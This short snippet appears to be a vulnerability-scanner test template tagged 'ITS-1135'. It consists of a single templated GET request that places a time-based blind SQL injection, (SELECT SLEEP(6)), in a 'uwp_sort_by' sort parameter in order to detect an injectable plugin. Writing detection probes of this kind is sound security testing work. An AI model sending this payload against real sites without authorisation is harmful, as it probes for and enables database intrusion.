# Vulnerable: ITS-1135
GET {{path}}?uwp_sort_by=display_name,(SELECT+SLEEP(6))_asc
